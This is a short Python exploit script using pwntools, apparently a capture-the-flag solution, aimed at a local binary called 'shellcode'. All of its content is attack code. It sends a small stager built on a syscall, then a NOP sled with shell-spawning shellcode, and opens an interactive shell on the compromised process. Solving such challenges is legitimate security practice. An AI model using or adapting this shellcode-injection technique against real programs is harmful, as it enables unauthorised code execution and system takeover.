from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

p = process('./shellcode')
p.recvuntil(b'shellcode:')

payload = asm("""
        mov rsi, rdx
        syscall
        """)

p.send(payload)
p.sendlineafter(b'shellcode:', b'\x00')
p.sendlineafter(b'shellcode:', b'\x00')
p.sendlineafter(b'shellcode:', b'\x00')

shell_payload = b'\x90'*5 + asm(shellcraft.sh())
p.sendline(shell_payload)

p.interactive()


